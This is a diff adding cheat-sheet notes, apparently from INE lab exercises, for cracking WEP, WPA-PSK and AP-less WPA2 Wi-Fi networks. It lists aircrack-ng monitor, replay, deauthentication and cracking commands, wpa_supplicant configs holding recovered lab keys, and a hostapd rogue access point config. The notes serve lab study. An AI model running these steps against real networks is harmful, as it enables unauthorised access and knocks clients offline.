@@ -114,3 +114,73 @@ aireplay-ng -0 1 -a <mac_address_ap> -c <client_mac_address> <interface>
 
 aircrack-ng -0 -w <wordlist> <captured_file_name>
 
+
+
+INE_Attack_defense_Example_WEP_1
+--------------------------------
+iw dev
+
+iw dev wlan0 setup monitor none
+
+airodump-ng wlan0
+
+airodump-ng wlan0 -c 6 -w capture
+
+aireplay-ng -3 -b B8:0D:F7:D5:79:F9 -h 02:00:00:00:09:00 wlan0
+
+aircrack-ng capture-01.cap
+
+**WPA Supplicant Configuration**
+network={
+  ssid="EpicMediaCorp"
+  key_mgmt=NONE
+  wep_key0="14332"
+  wep_tx_keyidx=0
+}
+**wpa_supplicant -B -Dnl80211 -iwlan1 -c supplicant.conf**
+**dhclient -v wlan1**
+
+
+
+INE_Attack_defense_Example_WPA-PSK_1
+------------------------------------
+iw dev
+
+airodump-ng wlan0 -c 6 -w test
+
+aireplay-ng -0 100 -a A2:E9:68:D3:03:10 wlan0
+
+aircrack-ng -w 100-common-passwords.txt test-01.cap
+
+**WPA Supplicant Configuration**
+network={
+  ssid="NewGenAirways"
+  scan_ssid=1
+  key_mgmt=WPA-PSK
+  psk="jasmine1"
+}
+**wpa_supplicant -B -Dnl80211 -iwlan1 -c supplicant.conf**
+**dhclient -v wlan1**
+
+
+INE_Attack_defense_Example_AP-less_WPA2-PSK_1
+----------------------------------------------
+iw dev
+
+airodump-ng wlan0 -c 6 -w capture
+
+**Fake_ap.conf content:**
+  interface=wlan1
+  hw_mode=g
+  channel=6
+  driver=nl80211
+  ssid=Woodwork_LLP
+  auth_algs=1
+  wpa=2
+  wpa_key_mgmt=WPA-PSK
+  rsn_pairwise=CCMP
+  wpa_passphrase=123456789
+  
+**hostapd -d fake_ap.conf**
+
+aircrack-ng -w 100-common-passwords.txt capture-01.cap
